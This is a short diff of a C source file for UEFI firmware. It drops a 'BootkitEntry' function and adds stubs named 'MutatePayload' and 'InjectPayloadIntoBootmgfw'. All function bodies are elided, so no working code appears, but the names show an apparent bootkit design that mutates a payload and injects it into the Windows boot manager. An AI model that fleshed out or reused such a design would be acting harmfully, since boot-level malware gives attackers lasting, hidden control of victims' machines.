@@ -1,5 +1,8 @@
 #include <Uefi.h>
 #include <Library/UefiLib.h>
-#include <Library/UefiBootServicesTableLib.h>
 
-EFI_STATUS EFIAPI BootkitEntry(IN EFI_HANDLE ImageHandle, IN EFI_SYSTEM_TABLE *SystemTable) { ... }
+// Updated with MutatePayload
+
+VOID MutatePayload(UINT8 *Payload, UINTN Size) { ... }
+
+EFI_STATUS InjectPayloadIntoBootmgfw(...) { ... }
